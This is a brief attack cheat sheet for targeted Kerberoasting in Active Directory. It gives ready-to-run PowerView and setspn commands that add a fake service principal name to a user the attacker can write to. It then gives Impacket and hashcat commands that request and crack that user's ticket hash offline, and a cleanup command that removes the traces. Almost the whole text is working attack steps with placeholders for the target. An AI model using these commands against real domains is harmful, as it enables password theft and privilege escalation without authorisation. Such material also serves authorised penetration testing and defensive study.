# Targeted Kerberoasting via GenericWrite SPN Add

`GenericWrite` on a user allows writing arbitrary attributes, including `servicePrincipalName`. Adding a fake SPN makes the account Kerberoastable — the hash is then crackable offline.

**Add SPN (PowerView):**
```powershell
Set-DomainObject -Identity <TARGET_USER> -SET @{serviceprincipalname='nonexistent/fake'}
# Verify:
Get-DomainUser <TARGET_USER> | Select serviceprincipalname
```

**Add SPN (setspn — Windows built-in):**
```cmd
setspn -a nonexistent/fake <DOMAIN>\<TARGET_USER>
setspn -l <TARGET_USER>   # verify
```

**Kerberoast the now-kerberoastable account:**
```bash
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile svc.hash
hashcat -m 13100 svc.hash /usr/share/wordlists/rockyou.txt
```

**Cleanup — remove SPN after exploit:**
```powershell
Set-DomainObject -Identity <TARGET_USER> -Clear serviceprincipalname
```
